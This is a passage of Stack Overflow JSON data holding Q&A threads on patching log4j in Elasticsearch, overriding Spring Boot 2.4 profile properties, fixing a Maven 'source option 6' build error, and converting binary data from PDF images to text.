files?"}],"answers":[{"tags":[],"owner":{"account_id":22111701,"reputation":31,"user_id":16366483,"display_name":"bilalcaliskan"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1639579376,"creation_date":1639579376,"answer_id":70365628,"question_id":70352068,"body_markdown":"Upgrading a single library dependency is not a good practice at all. I suggest to either upgrade Elasticsearch to 7.16.1 for 7.x or 6.8.21 for 6.x. \r\n\r\nAnother solution is to append below to your **/etc/elasticsearch/jvm.options**:\r\n```\r\n-Dlog4j2.formatMsgNoLookups=true\r\n```","title":"log4j upgrade in elasticsearch","body":"<p>Upgrading a single library dependency is not a good practice at all. I suggest to either upgrade Elasticsearch to 7.16.1 for 7.x or 6.8.21 for 6.x.</p>\n<p>Another solution is to append below to your <strong>/etc/elasticsearch/jvm.options</strong>:</p>\n<pre><code>-Dlog4j2.formatMsgNoLookups=true\n</code></pre>\n"}],"owner":{"account_id":22812212,"reputation":37,"user_id":16963330,"display_name":"Nishit Kumar"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":5981,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":1,"score":2,"last_activity_date":1639579376,"creation_date":1639498437,"question_id":70352068,"body_markdown":"Hello all I want to upgrade log4j in Elasticsearch the current version is shown below using the locate command , so which files I have to replace , also do I have to perform certain action after replacing the files\r\n\r\nroot@la-prod7-client1:/# locate log4j\r\n\r\n/etc/elasticsearch/log4j2.properties\r\n\r\n/usr/share/elasticsearch/lib/log4j-api-2.11.1.jar\r\n\r\n/usr/share/elasticsearch/lib/log4j-core-2.11.1.jar\r\n\r\n/usr/share/elasticsearch/modules/x-pack-core/log4j-1.2-api-2.11.1.jar \r\n\r\n/usr/share/elasticsearch/modules/x-pack-identity-provider/log4j-slf4j-impl-2.11.1.jar\r\n\r\n/usr/share/elasticsearch/modules/x-pack-security/log4j-slf4j-impl-2.11.1.jar\r\n\r\nelastic version is 7.10.2\r\nJVM 15.0.1\r\n\r\nI need to know the steps i have to follow in order to upgrade log4j from 2.11.1 to 2.16.0 ","title":"log4j upgrade in elasticsearch","body":"<p>Hello all I want to upgrade log4j in Elasticsearch the current version is shown below using the locate command , so which files I have to replace , also do I have to perform certain action after replacing the files</p>\n<p>root@la-prod7-client1:/# locate log4j</p>\n<p>/etc/elasticsearch/log4j2.properties</p>\n<p>/usr/share/elasticsearch/lib/log4j-api-2.11.1.jar</p>\n<p>/usr/share/elasticsearch/lib/log4j-core-2.11.1.jar</p>\n<p>/usr/share/elasticsearch/modules/x-pack-core/log4j-1.2-api-2.11.1.jar</p>\n<p>/usr/share/elasticsearch/modules/x-pack-identity-provider/log4j-slf4j-impl-2.11.1.jar</p>\n<p>/usr/share/elasticsearch/modules/x-pack-security/log4j-slf4j-impl-2.11.1.jar</p>\n<p>elastic version is 7.10.2\nJVM 15.0.1</p>\n<p>I need to know the steps i have to follow in order to upgrade log4j from 2.11.1 to 2.16.0</p>\n"},{"tags":["java","spring","spring-boot"],"comments":[{"owner":{"account_id":2134019,"reputation":808,"user_id":1894211,"display_name":"burm87"},"score":0,"creation_date":1607514609,"post_id":65216091,"comment_id":115294891,"body_markdown":"Where is the active profile property defined? How are you starting your application?","body":"Where is the active profile property defined? How are you starting your application?"},{"owner":{"account_id":2134019,"reputation":808,"user_id":1894211,"display_name":"burm87"},"score":0,"creation_date":1607515466,"post_id":65216091,"comment_id":115295292,"body_markdown":"Sorry just seen the answer to my first question. Have you tried activating a single profile or activating the profiles with a command line argument?","body":"Sorry just seen the answer to my first question. Have you tried activating a single profile or activating the profiles with a command line argument?"},{"owner":{"account_id":2091418,"reputation":463,"user_id":1861167,"accept_rate":50,"display_name":"Clement Martino"},"score":0,"creation_date":1607516312,"post_id":65216091,"comment_id":115295690,"body_markdown":"@burm87 i start my app with intellij, i tried to add the dev profil with the method setAdditionalProfiles, if i had only dev profile it&#39;s ok","body":"@burm87 i start my app with intellij, i tried to add the dev profil with the method setAdditionalProfiles, if i had only dev profile it&#39;s ok"},{"owner":{"account_id":2134019,"reputation":808,"user_id":1894211,"display_name":"burm87"},"score":0,"creation_date":1607516516,"post_id":65216091,"comment_id":115295804,"body_markdown":"Can you see the log line of the active profile in the logs? Are you sure all the names are correct? Actually, I&#39;ve just noticed you -kafka file and your -dev file are in two different folders, have you tried putting them in the same one?","body":"Can you see the log line of the active profile in the logs? Are you sure all the names are correct? Actually, I&#39;ve just noticed you -kafka file and your -dev file are in two different folders, have you tried putting them in the same one?"},{"owner":{"account_id":2091418,"reputation":463,"user_id":1861167,"accept_rate":50,"display_name":"Clement Martino"},"score":1,"creation_date":1607517409,"post_id":65216091,"comment_id":115296200,"body_markdown":"yes i see the profile names in the log file and i also tried putting them in the same folder...","body":"yes i see the profile names in the log file and i also tried putting them in the same folder..."},{"owner":{"account_id":2134019,"reputation":808,"user_id":1894211,"display_name":"burm87"},"score":0,"creation_date":1607517594,"post_id":65216091,"comment_id":115296304,"body_markdown":"This is everything I can think of. Hard to do remote debugging :)","body":"This is everything I can think of. Hard to do remote debugging :)"},{"owner":{"account_id":2091418,"reputation":463,"user_id":1861167,"accept_rate":50,"display_name":"Clement Martino"},"score":0,"creation_date":1641403418,"post_id":65216091,"comment_id":124797800,"body_markdown":"It&#39;s working again with spring-boot 2.5.6, so it was fixed in 2.5.x","body":"It&#39;s working again with spring-boot 2.5.6, so it was fixed in 2.5.x"}],"answers":[{"tags":[],"owner":{"account_id":9133904,"reputation":37,"user_id":6794358,"display_name":"IdiotDrake"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1607531564,"creation_date":1607531564,"answer_id":65220907,"question_id":65216091,"body_markdown":"they&#39;re not in the same folder and the run configuration probably indicates /config for the scan.","title":"Override property with my profile dev in Spring Boot 2.4","body":"<p>they're not in the same folder and the run configuration probably indicates /config for the scan.</p>\n"},{"tags":[],"owner":{"account_id":7002644,"reputation":119,"user_id":5368175,"display_name":"gviczai"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1612559476,"creation_date":1612552302,"answer_id":66069254,"question_id":65216091,"body_markdown":"In Spring Boot 2.4, configuration file handling is completely rethought and rewritten.\r\nLong story short: Forget the legacy profile-dependent documents. From now on, you have to use only one big application.properties file, but it can be divided into various profile-activated sections. These sections then can come from other files or even documents from URLs - see cloud-config.\r\n\r\nAnd the main rule is: definitions BELOW always overwrite definitions ABOVE. So be careful with the order the sections (thus profiles) follow each other! ;)\r\n\r\nYou can separate the sections with &quot;#---&quot; and you can define which profile activates the section by providing &quot;spring.config.activate.on-profile=&lt;your_profile&gt;&quot;\r\n\r\nSo, in your case your application.properties should look like this:\r\n\r\n    my.property=anything\r\n    ...\r\n    server.name=myserver\r\n    #in your &#39;default&#39; section, you can activate any profile, so it will be active by default\r\n    spring.profiles.active=kafka\r\n    #---\r\n    spring.config.activate.on-profile=kafka\r\n    spring.config.import=application-kafka.properties\r\n    #---\r\n    spring.config.activate.on-profile=dev\r\n    spring.config.import=application-dev.properties\r\n    #---\r\n    spring.config.activate.on-profile=cloud\r\n    spring.config.import=optional:configserver:http://my.config.server:8080/cloud-config\r\n\r\nOf course, you can use yaml file if you prefer. In this case the document separator is the standard &quot;---&quot;.\r\n\r\nRead more about this new paradigm of config file processing here: https://spring.io/blog/2020/08/14/config-file-processing-in-spring-boot-2-4\r\n\r\n(And I guess &#39;kafka&#39; profile wins over &#39;dev&#39; because &#39;k&#39; is AFTER &#39;d&#39; in the abc... BTW, I think it is better not to name the imported documents according to the legacy profile-dependent &quot;application-&amp;lt;profile&gt;.properties&quot; naming convention, because it may interfere with the profile-handling code. Better to be safe than sorry.)\r\n\r\nTip: Note, that in the same &#39;document&#39; (a section in the same file considered a document) even the spring.config.import can overwrite previous values. So if you need to import multiple sources within the same section, use a comma-separated list:\r\n```\r\nspring.config.import=classpath:config/kafka.properties,classpath:db/postgres.properties\r\n```\r\n","title":"Override property with my profile dev in Spring Boot 2.4","body":"<p>In Spring Boot 2.4, configuration file handling is completely rethought and rewritten.\nLong story short: Forget the legacy profile-dependent documents. From now on, you have to use only one big application.properties file, but it can be divided into various profile-activated sections. These sections then can come from other files or even documents from URLs - see cloud-config.</p>\n<p>And the main rule is: definitions BELOW always overwrite definitions ABOVE. So be careful with the order the sections (thus profiles) follow each other! ;)</p>\n<p>You can separate the sections with &quot;#---&quot; and you can define which profile activates the section by providing &quot;spring.config.activate.on-profile=&lt;your_profile&gt;&quot;</p>\n<p>So, in your case your application.properties should look like this:</p>\n<pre><code>my.property=anything\n...\nserver.name=myserver\n#in your 'default' section, you can activate any profile, so it will be active by default\nspring.profiles.active=kafka\n#---\nspring.config.activate.on-profile=kafka\nspring.config.import=application-kafka.properties\n#---\nspring.config.activate.on-profile=dev\nspring.config.import=application-dev.properties\n#---\nspring.config.activate.on-profile=cloud\nspring.config.import=optional:configserver:http://my.config.server:8080/cloud-config\n</code></pre>\n<p>Of course, you can use yaml file if you prefer. In this case the document separator is the standard &quot;---&quot;.</p>\n<p>Read more about this new paradigm of config file processing here: <a href=\"https://spring.io/blog/2020/08/14/config-file-processing-in-spring-boot-2-4\" rel=\"nofollow noreferrer\">https://spring.io/blog/2020/08/14/config-file-processing-in-spring-boot-2-4</a></p>\n<p>(And I guess 'kafka' profile wins over 'dev' because 'k' is AFTER 'd' in the abc... BTW, I think it is better not to name the imported documents according to the legacy profile-dependent &quot;application-&lt;profile&gt;.properties&quot; naming convention, because it may interfere with the profile-handling code. Better to be safe than sorry.)</p>\n<p>Tip: Note, that in the same 'document' (a section in the same file considered a document) even the spring.config.import can overwrite previous values. So if you need to import multiple sources within the same section, use a comma-separated list:</p>\n<pre><code>spring.config.import=classpath:config/kafka.properties,classpath:db/postgres.properties\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3408210,"reputation":141,"user_id":2858794,"display_name":"Klaus K."},"down_vote_count":0,"up_vote_count":6,"is_accepted":false,"score":6,"last_activity_date":1620055721,"creation_date":1620055721,"answer_id":67371619,"question_id":65216091,"body_markdown":"Thanks for the very helpful hint @gviczai, solved my problem loading and overriding configs from YAML files. \r\nI completely missed the following sentence in the documentation which made my unit tests fail because values have not been overridden as it was the case with Spring Boot 2.3.\r\n&gt; Imports can be considered as additional documents **inserted just below the document that declares them**. They follow the same top-down ordering as regular multi-document \r\n&gt; files: An import will only be imported once, no matter how many times it is declared.\r\n\r\nSo if you want to override imported values a new document has to be started after the import (--- in yaml, #--- in properties).\r\n\r\n```yaml\r\n# imported-config.yaml\r\nmy-key: my-value\r\n```\r\n\r\n```yaml\r\n# application.yaml\r\nspring:\r\n    config:\r\n        import:\r\n            - classpath:imported-config.yaml\r\n\r\n# before starting a new document the value can not be modified, it would still be &quot;my-value&quot;\r\nmy-key: here-overriding-does-not-work\r\n---\r\n# after the start of the new document the value can be modified\r\nmy-key: my-overridden-value\r\n```","title":"Override property with my profile dev in Spring Boot 2.4","body":"<p>Thanks for the very helpful hint @gviczai, solved my problem loading and overriding configs from YAML files.\nI completely missed the following sentence in the documentation which made my unit tests fail because values have not been overridden as it was the case with Spring Boot 2.3.</p>\n<blockquote>\n<p>Imports can be considered as additional documents <strong>inserted just below the document that declares them</strong>. They follow the same top-down ordering as regular multi-document\nfiles: An import will only be imported once, no matter how many times it is declared.</p>\n</blockquote>\n<p>So if you want to override imported values a new document has to be started after the import (--- in yaml, #--- in properties).</p>\n<pre class=\"lang-yaml prettyprint-override\"><code># imported-config.yaml\nmy-key: my-value\n</code></pre>\n<pre class=\"lang-yaml prettyprint-override\"><code># application.yaml\nspring:\n    config:\n        import:\n            - classpath:imported-config.yaml\n\n# before starting a new document the value can not be modified, it would still be &quot;my-value&quot;\nmy-key: here-overriding-does-not-work\n---\n# after the start of the new document the value can be modified\nmy-key: my-overridden-value\n</code></pre>\n"},{"tags":[],"owner":{"account_id":2091418,"reputation":463,"user_id":1861167,"accept_rate":50,"display_name":"Clement Martino"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639579274,"creation_date":1639579274,"answer_id":70365612,"question_id":65216091,"body_markdown":"It&#39;s working again with spring-boot 2.5.6, so it was fixed in 2.5.x","title":"Override property with my profile dev in Spring Boot 2.4","body":"<p>It's working again with spring-boot 2.5.6, so it was fixed in 2.5.x</p>\n"}],"owner":{"account_id":2091418,"reputation":463,"user_id":1861167,"accept_rate":50,"display_name":"Clement Martino"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":3671,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"answer_count":4,"score":3,"last_activity_date":1639579274,"creation_date":1607514044,"question_id":65216091,"body_markdown":"I tried to ovveride the property \r\n\r\n    kafka.servers=s101lbakafpep1:9092,s102lbakafpep2:9092,s101lbakafpep3:9092\r\n\r\ndefined in my **src/main/resources/config/application-kafka.properties** file\r\n\r\nwith this value \r\n\r\n    kafka.servers=localhost:9092\r\n\r\ndefined in my **src/main/resources/application-dev.properties** file\r\n\r\nI tried every combination possible reading the spring boot doc changing in my application.properties the order of \r\n\r\n    spring.profiles.active=config,health,planete,dgfip,mapping,kafka,dev\r\n    spring.profiles.active=dev,config,health,planete,dgfip,mapping,kafka\r\n\r\nusing spring.config.use-legacy-processing to true or false or .include, it&#39;s always the kafka config that wins\r\n\r\n\r\nIt&#39;s not working since i changed spring boot version to 2.4\r\n\r\n","title":"Override property with my profile dev in Spring Boot 2.4","body":"<p>I tried to ovveride the property</p>\n<pre><code>kafka.servers=s101lbakafpep1:9092,s102lbakafpep2:9092,s101lbakafpep3:9092\n</code></pre>\n<p>defined in my <strong>src/main/resources/config/application-kafka.properties</strong> file</p>\n<p>with this value</p>\n<pre><code>kafka.servers=localhost:9092\n</code></pre>\n<p>defined in my <strong>src/main/resources/application-dev.properties</strong> file</p>\n<p>I tried every combination possible reading the spring boot doc changing in my application.properties the order of</p>\n<pre><code>spring.profiles.active=config,health,planete,dgfip,mapping,kafka,dev\nspring.profiles.active=dev,config,health,planete,dgfip,mapping,kafka\n</code></pre>\n<p>using spring.config.use-legacy-processing to true or false or .include, it's always the kafka config that wins</p>\n<p>It's not working since i changed spring boot version to 2.4</p>\n"},{"tags":["java","maven","intellij-idea","maven-3"],"comments":[{"owner":{"account_id":36734,"reputation":392127,"user_id":104891,"display_name":"CrazyCoder"},"score":0,"creation_date":1617829563,"post_id":66993823,"comment_id":118420427,"body_markdown":"Does it help if you configure Maven to run on JDK 1.8? In IntelliJ IDEA this is controlled here: https://i.imgur.com/SbuV0a9.png and here https://i.imgur.com/wyh1S8c.png. On your OS/terminal it&#39;s controlled via the `JAVA_HOME` environment variable. It looks like you run Maven on JDK 11 or later which no longer supports 1.6 targets.","body":"Does it help if you configure Maven to run on JDK 1.8? In IntelliJ IDEA this is controlled here: <a href=\"https://i.imgur.com/SbuV0a9.png\" rel=\"nofollow noreferrer\">i.imgur.com/SbuV0a9.png</a> and here <a href=\"https://i.imgur.com/wyh1S8c.png\" rel=\"nofollow noreferrer\">i.imgur.com/wyh1S8c.png</a>. On your OS/terminal it&#39;s controlled via the <code>JAVA_HOME</code> environment variable. It looks like you run Maven on JDK 11 or later which no longer supports 1.6 targets."},{"owner":{"account_id":14584254,"reputation":476,"user_id":10533650,"display_name":"MayWheather"},"score":0,"creation_date":1617832085,"post_id":66993823,"comment_id":118421217,"body_markdown":"@CrazyCoder Omg, It&#39;s worked. Thank you so much! It&#39;s appeared that I didn&#39;t even have JDK 1.8 so I installed it and change JAVA_HOME. There were a lot of solution in the stackoverflow that I went though and I never stumbled the solution like this.","body":"@CrazyCoder Omg, It&#39;s worked. Thank you so much! It&#39;s appeared that I didn&#39;t even have JDK 1.8 so I installed it and change JAVA_HOME. There were a lot of solution in the stackoverflow that I went though and I never stumbled the solution like this."}],"answers":[{"tags":[],"owner":{"account_id":36734,"reputation":392127,"user_id":104891,"display_name":"CrazyCoder"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1617832634,"creation_date":1617832634,"answer_id":66994640,"question_id":66993823,"body_markdown":"Install Java 1.8 (JDK) and configure `JAVA_HOME` environment variable to point to the installation home of this Java version. You may need to logout/login or reboot for the environment variable change to have effect.\r\n\r\nMaven will use it for compilation and will be able to target 1.6 version.\r\n\r\nJava 11+ versions no longer support 1.6 target.\r\n\r\nIn IntelliJ IDEA it can be controlled here:\r\n\r\n- Settings (Preferences on macOS) | Build, Execution, Deployment | Build Tools | Maven | Importing | JDK for importer\r\n- Settings (Preferences on macOS) | Build, Execution, Deployment | Build Tools | Maven | Runner | JRE","title":"Intelij Maven : error: Source option 6 is no longer supported. Use 7 or later. Is there anymore solutions?","body":"<p>Install Java 1.8 (JDK) and configure <code>JAVA_HOME</code> environment variable to point to the installation home of this Java version. You may need to logout/login or reboot for the environment variable change to have effect.</p>\n<p>Maven will use it for compilation and will be able to target 1.6 version.</p>\n<p>Java 11+ versions no longer support 1.6 target.</p>\n<p>In IntelliJ IDEA it can be controlled here:</p>\n<ul>\n<li>Settings (Preferences on macOS) | Build, Execution, Deployment | Build Tools | Maven | Importing | JDK for importer</li>\n<li>Settings (Preferences on macOS) | Build, Execution, Deployment | Build Tools | Maven | Runner | JRE</li>\n</ul>\n"},{"tags":[],"owner":{"account_id":1803154,"reputation":641,"user_id":1640954,"display_name":"shrhawk"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1639578731,"creation_date":1639578731,"answer_id":70365472,"question_id":66993823,"body_markdown":"A quick solution is to use the maven docker image with required jdk\r\n[maven](https://hub.docker.com/_/maven?tab=tags)\r\n\r\n1. create the docker volume \r\n\r\n```\r\ndocker volume create --name maven-repo\r\n```\r\n\r\n2. run the maven docker from the root folder of the app\r\n```\r\ndocker run --rm -it \\\r\n    -v maven-repo:/root/.m2 \\\r\n    -v &quot;$(pwd)&quot;:/usr/src/mymaven \\\r\n    -w /usr/src/mymaven \\\r\n    maven:3.2.5-jdk-8 \\\r\n    mvn clean install\r\n```","title":"Intelij Maven : error: Source option 6 is no longer supported. Use 7 or later. Is there anymore solutions?","body":"<p>A quick solution is to use the maven docker image with required jdk\n<a href=\"https://hub.docker.com/_/maven?tab=tags\" rel=\"nofollow noreferrer\">maven</a></p>\n<ol>\n<li>create the docker volume</li>\n</ol>\n<pre><code>docker volume create --name maven-repo\n</code></pre>\n<ol start=\"2\">\n<li>run the maven docker from the root folder of the app</li>\n</ol>\n<pre><code>docker run --rm -it \\\n    -v maven-repo:/root/.m2 \\\n    -v &quot;$(pwd)&quot;:/usr/src/mymaven \\\n    -w /usr/src/mymaven \\\n    maven:3.2.5-jdk-8 \\\n    mvn clean install\n</code></pre>\n"}],"owner":{"account_id":14584254,"reputation":476,"user_id":10533650,"display_name":"MayWheather"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":8065,"favorite_count":0,"down_vote_count":1,"up_vote_count":2,"accepted_answer_id":66994640,"answer_count":2,"score":1,"last_activity_date":1639578731,"creation_date":1617828066,"question_id":66993823,"body_markdown":"I&#39;m trying to install dependendies using ```mvn install``` but I got thiss error :\r\n\r\n```\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] BUILD FAILURE\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] Total time:  2.299 s\r\n[INFO] Finished at: 2021-04-07T23:29:40+03:00\r\n[INFO] ------------------------------------------------------------------------\r\n[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:2.3.2:compile (default-compile) on project words-api: Compilation failure: Compilation failure:\r\n[ERROR] error: Source option 6 is no longer supported. Use 7 or later.\r\n[ERROR] error: Target option 6 is no longer supported. Use 7 or later.\r\n[ERROR] -&gt; [Help 1]\r\n[ERROR]\r\n[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.\r\n[ERROR] Re-run Maven using the -X switch to enable full debug logging.\r\n[ERROR]\r\n[ERROR] For more information about the errors and possible solutions, please read the following articles:\r\n[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException\r\n&#39;cmd&#39; is not recognized as an internal or external command,\r\noperable program or batch file.\r\n\r\n```\r\n\r\nI tried to find solution on stackoverflow but for now I still get same error\r\n\r\nWhat I&#39;ve tried :\r\n1. Changing level language\r\n2.Adding properties to pom.xml file \r\n\r\nOther solution that I&#39;ve found involves other type of IDE\r\n\r\nHere is my pom.xml file:\r\n```\r\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\r\n&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;\r\n         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\r\n         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\r\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\r\n\r\n    &lt;groupId&gt;groupId&lt;/groupId&gt;\r\n    &lt;artifactId&gt;untitled1&lt;/artifactId&gt;\r\n    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;\r\n\r\n    &lt;properties&gt;\r\n        &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt;\r\n        &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt;\r\n    &lt;/properties&gt;\r\n\r\n    &lt;build&gt;\r\n        &lt;plugins&gt;\r\n        &lt;plugin&gt;\r\n            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n            &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\r\n            &lt;version&gt;3.1&lt;/version&gt;\r\n            &lt;configuration&gt;\r\n                &lt;source&gt;1.8&lt;/source&gt;\r\n                &lt;target&gt;1.8&lt;/target&gt;\r\n            &lt;/configuration&gt;\r\n        &lt;/plugin&gt;\r\n        &lt;/plugins&gt;\r\n    &lt;/build&gt;\r\n&lt;/project&gt;\r\n\r\n```\r\nI&#39;m new to Maven and if you know any solutions tha I haven&#39;t tried please comment down below. I will be thankfull for your answers\r\n\r\nEdit: I&#39;m using apache.maven.3.8.1","title":"Intelij Maven : error: Source option 6 is no longer supported. Use 7 or later. Is there anymore solutions?","body":"<p>I'm trying to install dependendies using <code>mvn install</code> but I got thiss error :</p>\n<pre><code>[INFO] ------------------------------------------------------------------------\n[INFO] BUILD FAILURE\n[INFO] ------------------------------------------------------------------------\n[INFO] Total time:  2.299 s\n[INFO] Finished at: 2021-04-07T23:29:40+03:00\n[INFO] ------------------------------------------------------------------------\n[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:2.3.2:compile (default-compile) on project words-api: Compilation failure: Compilation failure:\n[ERROR] error: Source option 6 is no longer supported. Use 7 or later.\n[ERROR] error: Target option 6 is no longer supported. Use 7 or later.\n[ERROR] -&gt; [Help 1]\n[ERROR]\n[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.\n[ERROR] Re-run Maven using the -X switch to enable full debug logging.\n[ERROR]\n[ERROR] For more information about the errors and possible solutions, please read the following articles:\n[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException\n'cmd' is not recognized as an internal or external command,\noperable program or batch file.\n\n</code></pre>\n<p>I tried to find solution on stackoverflow but for now I still get same error</p>\n<p>What I've tried :</p>\n<ol>\n<li>Changing level language\n2.Adding properties to pom.xml file</li>\n</ol>\n<p>Other solution that I've found involves other type of IDE</p>\n<p>Here is my pom.xml file:</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;\n         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;\n         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n\n    &lt;groupId&gt;groupId&lt;/groupId&gt;\n    &lt;artifactId&gt;untitled1&lt;/artifactId&gt;\n    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;\n\n    &lt;properties&gt;\n        &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt;\n        &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt;\n    &lt;/properties&gt;\n\n    &lt;build&gt;\n        &lt;plugins&gt;\n        &lt;plugin&gt;\n            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n            &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;\n            &lt;version&gt;3.1&lt;/version&gt;\n            &lt;configuration&gt;\n                &lt;source&gt;1.8&lt;/source&gt;\n                &lt;target&gt;1.8&lt;/target&gt;\n            &lt;/configuration&gt;\n        &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;\n&lt;/project&gt;\n\n</code></pre>\n<p>I'm new to Maven and if you know any solutions tha I haven't tried please comment down below. I will be thankfull for your answers</p>\n<p>Edit: I'm using apache.maven.3.8.1</p>\n"},{"tags":["java","binary","binaryfiles","data-conversion"],"comments":[{"owner":{"account_id":15064163,"reputation":13519,"user_id":10871900,"display_name":"dan1st is crying"},"score":1,"creation_date":1639578667,"post_id":70365376,"comment_id":124384862,"body_markdown":"If you want to convert arbitiary binary data to readable characters, you may want to use Base64.","body":"If you want to convert arbitiary binary data to readable characters, you may want to use Base64."},{"owner":{"account_id":2653232,"reputation":4799,"user_id":2294428,"display_name":"StephaneM"},"score":1,"creation_date":1639580154,"post_id":70365376,"comment_id":124385517,"body_markdown":"Where do you see that your character is not correct? If you display it in your console using a println it might just be the console that cannot display it. By default my console cannot display the ascii character 238 (11101110).","body":"Where do you see that your character is not correct? If you display it in your console using a println it might just be the console that cannot display it. By default my console cannot display the ascii character 238 (11101110)."},{"owner":{"account_id":2053598,"reputation":41316,"user_id":1831987,"display_name":"VGR"},"score":0,"creation_date":1639580185,"post_id":70365376,"comment_id":124385536,"body_markdown":"Charsets like UTF-8 and ISO-8859-1 have nothing to do with this.  You should not be using them at all.  For what it’s worth, the third and fourth values in your input (10000000 10011110, or 0x80 0x9e) are not printable characters.  Is this data supposed to be text, or just binary data?","body":"Charsets like UTF-8 and ISO-8859-1 have nothing to do with this.  You should not be using them at all.  For what it’s worth, the third and fourth values in your input (10000000 10011110, or 0x80 0x9e) are not printable characters.  Is this data supposed to be text, or just binary data?"},{"owner":{"account_id":1689973,"reputation":37280,"user_id":1552534,"display_name":"WJS"},"score":0,"creation_date":1639581527,"post_id":70365376,"comment_id":124386166,"body_markdown":"All data is binary.  How it is to be interpreted is the issue.  What is its origin?  How do you know it isn&#39;t UTF-16 or some variant? Or little endian vs big endian?","body":"All data is binary.  How it is to be interpreted is the issue.  What is its origin?  How do you know it isn&#39;t UTF-16 or some variant? Or little endian vs big endian?"},{"owner":{"account_id":12612807,"reputation":5,"user_id":9171286,"display_name":"Ajay Sethi"},"score":0,"creation_date":1639584573,"post_id":70365376,"comment_id":124387455,"body_markdown":"I get these binary data from the images embedded into pdf file and I extract this data from those images and then convert it, if It is just console is not able to print it then can you please suggest about other options? The idea is to dump that readable characters into a txt file. please help","body":"I get these binary data from the images embedded into pdf file and I extract this data from those images and then convert it, if It is just console is not able to print it then can you please suggest about other options? The idea is to dump that readable characters into a txt file. please help"},{"owner":{"account_id":2053598,"reputation":41316,"user_id":1831987,"display_name":"VGR"},"score":0,"creation_date":1639585232,"post_id":70365376,"comment_id":124387718,"body_markdown":"Your approach will not correctly extract text from most PDF documents.  Use a PDF parsing library.","body":"Your approach will not correctly extract text from most PDF documents.  Use a PDF parsing library."},{"owner":{"account_id":1689973,"reputation":37280,"user_id":1552534,"display_name":"WJS"},"score":2,"creation_date":1639586143,"post_id":70365376,"comment_id":124388084,"body_markdown":"&quot;Ajay Sethi: *I get these binary data from the images embedded into pdf file ...*&quot;  That is critical information and should have been part of the question.  Do what @VGR suggested.","body":"&quot;Ajay Sethi: <i>I get these binary data from the images embedded into pdf file ...</i>&quot;  That is critical information and should have been part of the question.  Do what @VGR suggested."},{"owner":{"account_id":12612807,"reputation":5,"user_id":9171286,"display_name":"Ajay Sethi"},"score":0,"creation_date":1639595530,"post_id":70365376,"comment_id":124391595,"body_markdown":"@VGR I&#39;m using PDF parsing library to extract binary data from pdf images and dumping all binary data into a txt file and reading from that txt file and converting, that&#39;s working fine, but  the binary code ( 11101110) is present in my pdf images around 28 times and the output file which I&#39;m generating post conversion has also got 28 question marks symbol except these 28 junk characters, all binary code got converted fine. I&#39;m suspecting while converting byte array into string is causing issue or eclipse console is not able to print the readable char (i&#39;m running this program in windows)","body":"@VGR I&#39;m using PDF parsing library to extract binary data from pdf images and dumping all binary data into a txt file and reading from that txt file and converting, that&#39;s working fine, but  the binary code ( 11101110) is present in my pdf images around 28 times and the output file which I&#39;m generating post conversion has also got 28 question marks symbol except these 28 junk characters, all binary code got converted fine. I&#39;m suspecting while converting byte array into string is causing issue or eclipse console is not able to print the readable char (i&#39;m running this program in windows)"},{"owner":{"account_id":2053598,"reputation":41316,"user_id":1831987,"display_name":"VGR"},"score":0,"creation_date":1639595699,"post_id":70365376,"comment_id":124391655,"body_markdown":"I don’t understand what you’re doing.  You’re dumping binary data from images?  Why would you expect that data to represent readable characters?  Why is that data represented as binary digits (zeroes and ones)?  Where are you converting a byte array into a string, and why are you doing that?  It seems like you are doing a lot of steps that are part of your problem, but you left those steps out of your question.","body":"I don’t understand what you’re doing.  You’re dumping binary data from images?  Why would you expect that data to represent readable characters?  Why is that data represented as binary digits (zeroes and 